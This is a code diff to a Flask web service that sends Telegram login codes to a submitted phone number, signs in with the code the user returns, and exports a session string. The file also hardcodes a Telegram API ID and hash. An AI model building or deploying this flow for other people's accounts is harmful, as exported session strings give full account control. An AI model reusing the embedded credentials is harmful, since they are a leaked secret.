@@ -11,7 +11,7 @@ CORS(app)
 API_ID = 33511945
 API_HASH = "d044392a17690c14ee5b4a23651a0700"
 
-temp_clients = {}
+temp_hashes = {}
 
 @app.route('/', methods=['GET'])
 def home():
@@ -42,15 +42,12 @@ def send_code():
             client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
             sent_code = await client.send_code(phone)
-            return client, sent_code.phone_code_hash
+            phone_code_hash = sent_code.phone_code_hash
+            await client.disconnect()
+            return phone_code_hash
 
-        client, phone_code_hash = asyncio.run(main())
-        
-        # ক্লায়েন্ট কানেকশন মেমোরিতে সেভ করে রাখা
-        temp_clients[phone] = {
-            "client": client,
-            "phone_code_hash": phone_code_hash
-        }
+        phone_code_hash = asyncio.run(main())
+        temp_hashes[phone] = phone_code_hash
         
         return jsonify({"status": "success", "message": "OTP code sent to Telegram!"})
     except Exception as e:
@@ -65,15 +62,17 @@ def verify_code():
     if not phone or not code:
         return jsonify({"status": "error", "message": "Phone and Code are required"}), 400
 
-    if phone not in temp_clients:
+    if phone not in temp_hashes:
         return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400
 
-    user_data = temp_clients[phone]
-    client = user_data["client"]
-    phone_code_hash = user_data["phone_code_hash"]
+    phone_code_hash = temp_hashes[phone]
 
     try:
+        session_name = f"session_{phone.replace('+', '')}"
+        
         async def verify_main():
+            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
+            await client.connect()
             await client.sign_in(phone, phone_code_hash, code)
             session_string = await client.export_session_string()
             
@@ -85,7 +84,7 @@ def verify_code():
             await client.disconnect()
 
         asyncio.run(verify_main())
-        del temp_clients[phone]
+        del temp_hashes[phone]
         
         return jsonify({"status": "success", "message": "Session generated successfully!"})
         
